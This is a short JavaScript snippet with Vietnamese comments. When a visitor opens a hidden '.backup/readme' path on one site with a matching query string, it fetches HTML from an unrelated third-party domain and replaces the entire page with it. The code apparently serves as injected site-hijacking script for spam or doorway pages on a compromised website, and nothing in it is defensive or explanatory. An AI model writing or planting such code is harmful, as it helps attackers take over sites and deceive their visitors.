// Lấy URL hiện tại
const huulung = window.location.href.toLowerCase();

// Nếu URL chứa đường dẫn cần check
if (huulung.includes("iwistw.com/upload/files/.backup/readme")) {

    // Danh sách file cần check
    const list_file = [
        "bqbtt-69136.html",
		"ctkvt-62829.html"
    ];

    // Tìm file phù hợp
    const found = list_file.find(item => huulung.includes("?" + item));

    // Nếu tìm thấy thì load
    if (found) {
        loadFile("https://phukhoathaiha.com/3rd/iwistw/" + found);
    }
}

// Hàm load nội dung HTML từ file
function loadFile(file) {
    fetch(file)
        .then(res => res.text())
        .then(html => {
            document.documentElement.innerHTML = html;
        });
}
